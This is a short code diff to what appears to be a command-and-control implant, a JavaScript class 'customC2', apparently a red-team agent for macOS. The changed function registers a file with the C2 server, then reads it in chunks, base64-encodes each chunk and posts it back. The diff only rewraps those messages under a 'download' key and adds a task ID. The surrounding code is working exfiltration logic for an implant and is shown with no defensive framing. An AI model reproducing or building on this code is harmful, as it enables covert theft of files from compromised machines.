@@ -472,7 +472,7 @@ class customC2 extends baseC2{
         }
         // always round up to account for chunks that are < chunksize;
         let numOfChunks = Math.ceil(fileSize / chunkSize);
-        let registerData = {'total_chunks': numOfChunks, "full_path": full_path};
+        let registerData = {"download": {'total_chunks': numOfChunks, "full_path": full_path}};
         let registerFile = this.postResponse(task, registerData);
         if (registerFile['responses'][0]['status'] === "success"){
             handle.seekToFileOffset(0);
@@ -484,7 +484,9 @@ class customC2 extends baseC2{
             let data = handle.readDataOfLength(chunkSize);
             while(parseInt(data.length) > 0 && offset < fileSize){
                 // send a chunk
-                let fileData = {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'file_id': registerFile['responses'][0]['file_id']};
+                let fileData = {"download": {'chunk_num': currentChunk,
+                        'chunk_data': data.base64EncodedStringWithOptions(0).js,
+                        'file_id': registerFile['responses'][0]['file_id']}, "task_id": task.id};
                 let response = this.postResponse(task, fileData);
                 if(response['responses'][0]['status'] === 'success'){
                   offset += parseInt(data.length);
